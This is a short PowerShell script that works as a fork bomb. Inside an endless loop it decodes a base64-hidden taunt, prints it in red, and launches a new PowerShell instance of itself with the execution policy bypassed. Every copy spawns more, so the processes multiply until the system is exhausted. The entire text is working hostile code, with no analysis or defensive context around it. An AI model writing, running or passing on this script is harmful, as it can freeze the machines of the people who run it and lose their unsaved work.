while($true) {
    $foo = "TVdBQUFBQUFBSEFIQUhBISEh"
    $bar = [System.Convert]::FromBase64String($foo)
    $qux = [System.Text.Encoding]::UTF8.GetString($bar)
    Write-Host $qux -BackgroundColor Black -ForegroundColor Red
    Start-Process powershell.exe -ArgumentList "-NoExit", "-ExecutionPolicy", "Bypass", $PSCommandPath
}
